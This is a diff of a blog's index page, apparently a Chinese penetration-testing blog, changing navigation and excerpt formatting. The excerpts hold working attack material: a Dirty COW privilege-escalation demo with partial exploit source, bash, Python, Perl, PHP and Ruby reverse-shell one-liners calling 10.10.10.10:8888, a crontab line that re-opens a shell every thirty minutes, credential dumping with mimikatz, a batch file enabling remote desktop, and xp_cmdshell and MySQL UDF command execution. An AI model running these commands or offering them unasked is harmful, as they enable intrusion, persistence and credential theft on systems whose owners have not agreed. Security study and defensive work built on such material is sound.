@@ -53,24 +53,6 @@
     </h1>
     <ul class="nav">
         
-            
-                <li>
-                    <a href="/"><i class='fa fa-home fa-fw'></i>Home</a>
-            
-                </li>
-        
-            
-                <li>
-                    <a href="/posts/"><i class='fa fa-list fa-fw'></i>Archive</a>
-            
-                </li>
-        
-            
-                <li>
-                    <a href="/about/"><i class='fa fa-user fa-fw'></i>About</a>
-            
-                </li>
-        
     </ul>
 </div>
 
@@ -121,7 +103,9 @@
 
     
     <p style="max-height:130px;overflow:hidden;line-height:1.6;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 测试环境 我是在本地虚拟机测试的，个人理解这个漏洞的话可以起到的作用是：一个普通用户可以覆盖一个root用户的只读文件，若理解有误则希望大家提意见 CentOS release 6.5 [reber123@WYB ~]$ uname -a Linux WYB 3.10.5-3.el6.x86_64 #1 SMP Tue Aug 20 14:10:49 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux [reber123@WYB ~]$ id uid=502(reber123) gid=502(reber123) groups=502(reber123) 0x01 创建文件 查看文件权限信息，可以看到属主为root，且只读，权限为0404 [reber123@WYB ~]$ ls -al test -r-----r-- 1 root root 19 Oct 21 00:02 test [reber123@WYB ~]$ cat test this is not a test [reber123@WYB ~]$ 0x02 编译、执行poc POC保存为a.c，编译为aaa [reber123@WYB ~]$ gcc -lpthread a.c -o aaa [reber123@WYB ~]$ ls aaa a.c test [reber123@WYB ~]$ 更改test的内容 [reber123@WYB ~]$ ./aaa test xxxxxxxxxxx mmap f8969000 ^C [reber123@WYB ~]$ cat test xxxxxxxxxxx a test [reber123@WYB ~]$ 0x03 后续利用 更改用户gid为0即可 提权后执行下：echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecs 用来关闭pdflush刷新,否则提权后过几秒系统就会卡死 0x04 附poc /* ####################### dirtyc0w.c ####################### $ sudo -s # echo this is not a test &gt; foo # chmod 0404 foo $ ls -lah foo -r-----r-- 1 root root 19 Oct 20 15:23 foo $ cat foo this is not a test $ gcc -lpthread dirtyc0w.c -o dirtyc0w $ ./dirtyc0w foo m00000000000000000 mmap 56123000 madvise 0 procselfmem 1800000000 $ cat foo m00000000000000000 ####################### dirtyc0w.c ####################### */ #include &lt;stdio.h&gt; #include &lt;sys/mman.h&gt; #include &lt;fcntl.h&gt; #include &lt;pthread.h&gt; #include &lt;string.h&gt; void *map; int f; struct stat st; char *name; void *madviseThread(void *arg) { char *str; str=(char*)arg; int i,c=0; for(i=0;i&lt;100000000;i++) { /* You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/secu ...
+        0x00 测试环境  我是在本地虚拟机测试的，个人理解这个漏洞的话可以起到的作用是：一个普通用户可以覆盖一个root用户的只读文件，若理解有误则希望大家提意见
+CentOS release 6.5 [reber123@WYB ~]$ uname -a Linux WYB 3.10.5-3.el6.x86_64 #1 SMP Tue Aug 20 14:10:49 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux [reber123@WYB ~]$ id uid=502(reber123) gid=502(reber123) groups=502(reber123)   0x01 创建文件  查看文件权限信息，可以看到属主为root，且只读，权限为0404
+[reber123@WYB ~]$ ls -al test -r-----r-- 1 root root 19 Oct 21 00:02 test [reber123@WYB ~]$ cat test this is not a test [reber123@WYB ~]$   0x02 编译、执行poc  POC保存为a.c，编译为aaa
     </p>
 
     
@@ -174,9 +158,14 @@
 
     
     <p style="max-height:130px;overflow:hidden;line-height:1.6;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 Linux下的提权 Linux下一般都是系统漏洞提权，分为以下几个步骤： 1. 获取系统版本号 2. 根据系统版本号找对应exp 3. 反弹shell 4. 尝试利用 0x01 提权 获取系统版本号 获取发行版本 cat /etc/*-release cat /etc/issue cat /etc/lsb-release cat /etc/redhat-release 获取内核版本 cat /proc/version uname -a uname -mrs rpm -q kernel dmesg | grep Linux ls /boot | grep vmlinuz 根据系统版本号找对应exp http://www.exploit-db.com http://1337day.com http://www.securiteam.com http://www.securityfocus.com http://www.exploitsearch.net http://metasploit.com/modules http://securityreason.com http://seclists.org/fulldisclosure http://www.google.com 反弹shell 本地：nc -l -p 8888 目标机器：/bin/bash -i &gt;&amp; /dev/tcp/10.10.10.10/8888 0&gt;&amp;1 尝试利用 0x02 实例 得到系统版本号 找对应exp 反弹shell 提权
+        0x00 Linux下的提权  Linux下一般都是系统漏洞提权，分为以下几个步骤：
+1. 获取系统版本号 2. 根据系统版本号找对应exp 3. 反弹shell 4. 尝试利用   0x01 提权  获取系统版本号  获取发行版本  cat /etc/*-release cat /etc/issue cat /etc/lsb-release cat /etc/redhat-release  获取内核版本  cat /proc/version uname -a uname -mrs rpm -q kernel dmesg | grep Linux ls /boot | grep vmlinuz   根据系统版本号找对应exp  http://www.exploit-db.com http://1337day.com http://www.securiteam.com http://www.securityfocus.com http://www.exploitsearch.net http://metasploit.com/modules http://securityreason.com http://seclists.org/fulldisclosure http://www.google.com  反弹shell  本地：nc -l -p 8888 目标机器：/bin/bash -i &gt;&amp; /dev/tcp/10.
     </p>
 
+    
+    <footer>
+        <a href="/posts/linux-use-system-vulnerabilities-elevate-privileges/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
     
 </article>
 
@@ -223,9 +212,15 @@
 
     
     <p style="max-height:130px;overflow:hidden;line-height:1.6;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 导出主机密码hash 条件 administrator以上权限 工具 wce gethash hashdump hash解密网站 http://www.objectif-securite.ch/ophcrack.php 上传工具得到hash 0x01 导出主机密码 条件 administrator以上权限 当前管理员没有注销登陆(可以通过query user命令看出) 工具 mimikatz getpass 上传工具得到密码 0x02 开启3389 直接使用注册表 写一个批处理也行 # 3389.bat内容如下： echo Windows Registry Editor Version 5.00&gt;&gt;3389.reg echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]&gt;&gt;3389.reg echo &quot;fDenyTSConnections&quot;=dword:00000000&gt;&gt;3389.reg echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp]&gt;&gt;3389.reg echo &quot;PortNumber&quot;=dword:00000d3d&gt;&gt;3389.reg echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]&gt;&gt;3389.reg echo &quot;PortNumber&quot;=dword:00000d3d&gt;&gt;3389.reg regedit /s 3389.reg del 3389.reg del 3389.bat
+        0x00 导出主机密码hash  条件  administrator以上权限  工具  wce gethash hashdump  hash解密网站
+ http://www.objectif-securite.ch/ophcrack.php  上传工具得到hash   0x01 导出主机密码  条件  administrator以上权限 当前管理员没有注销登陆(可以通过query user命令看出)  工具  mimikatz getpass  上传工具得到密码   0x02 开启3389  直接使用注册表  写一个批处理也行
+# 3389.bat内容如下： echo Windows Registry Editor Version 5.00&gt;&gt;3389.reg echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]&gt;&gt;3389.reg echo &quot;fDenyTSConnections&quot;=dword:00000000&gt;&gt;3389.reg echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp]&gt;&gt;3389.
     </p>
 
+    
+    <footer>
+        <a href="/posts/export-host-password-and-open-3389/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
     
 </article>
 
@@ -272,9 +267,23 @@
 
     
     <p style="max-height:130px;overflow:hidden;line-height:1.6;position: relative;word-wrap: break-word !important;z-index:1;">
-        MSSQL和MySQL提权 MSSQL提权 MSSQL运行在system权限时才可以通过xp_cmdshell组件执行系统命令提权 提权条件：数据库账号是DBA权限 关于xp_cmdshell 得到数据库连接信息，连接数据库后执行EXEC xp_cmdshell &lsquo;net user&rsquo;; 有sql注入时也可以直接在url上使用xp_cmdshell，因为mssql可以多语句执行，例如?id=1;EXEC xp_cmdshell &lsquo;net user&rsquo;;-- 连接数据库 执行系统命令 添加用户 远程连接 MySQL提权 环境：web应用服务器权限较低 提权条件：MySQL是system权限 关于UDF MySQL提权可以用UDF和Mof。UDF就是User defined Function，即用户定义函数，可以通过创建存储方法来定义函数，从而调用系统命令。 UDF提权过程 导入udf.dll到服务器指定目录 MySQL版本小于5.1的udf.dll要导入到c:\windows\目录下 MySQL版本大于等于5.1的udf.dll要导入到plugin_dir目录，plugin_dir在MySQL安装目录下的lib/plugin目录下(MySQL安装目录可以用select @@basedir得到)，默认不存在这个目录，我们要自己创建 使用SQL语句创建功能函数 CREATE FUNCTION shell RETURNS STRING SONAME &lsquo;udf.dll&rsquo;; 执行MySQL语句调用新创建的函数 select shell(&lsquo;cmd&rsquo;,&lsquo;whoami&rsquo;); 删除创建的函数 drop function shell; 查看基本信息 上传udf提权 添加用户 远程连接
+        MSSQL和MySQL提权
+MSSQL提权  MSSQL运行在system权限时才可以通过xp_cmdshell组件执行系统命令提权
+提权条件：数据库账号是DBA权限
+ 关于xp_cmdshell  得到数据库连接信息，连接数据库后执行EXEC xp_cmdshell &lsquo;net user&rsquo;; 有sql注入时也可以直接在url上使用xp_cmdshell，因为mssql可以多语句执行，例如?id=1;EXEC xp_cmdshell &lsquo;net user&rsquo;;--  连接数据库   执行系统命令   添加用户   远程连接   
+MySQL提权  环境：web应用服务器权限较低
+提权条件：MySQL是system权限
+ 关于UDF  MySQL提权可以用UDF和Mof。UDF就是User defined Function，即用户定义函数，可以通过创建存储方法来定义函数，从而调用系统命令。
+ UDF提权过程  导入udf.dll到服务器指定目录
+ MySQL版本小于5.1的udf.dll要导入到c:\windows\目录下
+ MySQL版本大于等于5.1的udf.dll要导入到plugin_dir目录，plugin_dir在MySQL安装目录下的lib/plugin目录下(MySQL安装目录可以用select @@basedir得到)，默认不存在这个目录，我们要自己创建  使用SQL语句创建功能函数
+CREATE FUNCTION shell RETURNS STRING SONAME &lsquo;udf.
     </p>
 
+    
+    <footer>
+        <a href="/posts/windows-use-third-party-server-elevate-privileges/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
     
 </article>
 
@@ -321,7 +330,8 @@
 
     
     <p style="max-height:130px;overflow:hidden;line-height:1.6;position: relative;word-wrap: break-word !important;z-index:1;">
-        提权是在已经getshell但是权限不大的前提下做的 0x00 查看基本信息 0x01 使用cmd执行命令 尝试使用cmd执行命令 找可写目录 尝试上传cmd.exe 写一个aspx马 上传cmd.exe 再次尝试使用cmd执行命令 0x02 权限提升 查看未安装补丁 上传exp提权 0x03 添加用户 添加远程连接用户 0x04 使用3389远程连接
+         提权是在已经getshell但是权限不大的前提下做的
+0x00 查看基本信息   0x01 使用cmd执行命令  尝试使用cmd执行命令  找可写目录  尝试上传cmd.exe  写一个aspx马  上传cmd.exe  再次尝试使用cmd执行命令   0x02 权限提升  查看未安装补丁  上传exp提权   0x03 添加用户  添加远程连接用户   0x04 使用3389远程连接   
     </p>
 
     
@@ -370,7 +380,8 @@
 
     
     <p style="max-height:130px;overflow:hidden;line-height:1.6;position: relative;word-wrap: break-word !important;z-index:1;">
-        当你找到一个有命令执行的主机时，你可能想要一个交互式deshell，如果你不能添加用户或者添加ssh密钥时，你就需要反弹一个shell来实现，下面的都是反弹shell的命令 0x00 Bash /bin/bash -i &gt;&amp; /dev/tcp/10.10.10.10/8888 0&gt;&amp;1 注：这个由解析shell的bash完成，有些时候不支持 0x01 crontab 下面这条命令执行后会每隔30分钟反弹一次： (crontab -l;printf &quot;*/30 * * * * exec 9&lt;&gt; /dev/tcp/10.10.10.10/8888;exec 0&lt;&amp;9; exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n&quot;)| crontab - 0x02 Python # 下面为1条命令 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect((&quot;10.10.10.10&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);' 0x03 Perl # 下面为1条命令 perl -e 'use Socket;$i=&quot;10.10.10.10&quot;;$p=8888;socket(S,PF_INET,SOCK_STREAM, getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN, &quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};' 0x04 PHP php -r '$sock=fsockopen(&quot;10.10.10.10&quot;,8888);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);' 0x05 Ruby # 下面为1条命令 ruby -rsocket
+        当你找到一个有命令执行的主机时，你可能想要一个交互式deshell，如果你不能添加用户或者添加ssh密钥时，你就需要反弹一个shell来实现，下面的都是反弹shell的命令
+0x00 Bash /bin/bash -i &gt;&amp; /dev/tcp/10.10.10.10/8888 0&gt;&amp;1 注：这个由解析shell的bash完成，有些时候不支持  0x01 crontab 下面这条命令执行后会每隔30分钟反弹一次： (crontab -l;printf &quot;*/30 * * * * exec 9&lt;&gt; /dev/tcp/10.10.10.10/8888;exec 0&lt;&amp;9; exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n&quot;)| crontab -  0x02 Python # 下面为1条命令 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect((&quot;10.10.10.10&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'  0x03 Perl # 下面为1条命令 perl -e 'use Socket;$i=&quot;10.10.10.10&quot;;$p=8888;socket(S,PF_INET,SOCK_STREAM, getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN, &quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'  0x04 PHP php -r '$sock=fsockopen(&quot;10.10.10.10&quot;,8888);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'  0x05 Ruby # 下面为1条命令 ruby -rsocket -e'f=TCPSocket.
     </p>
 
     
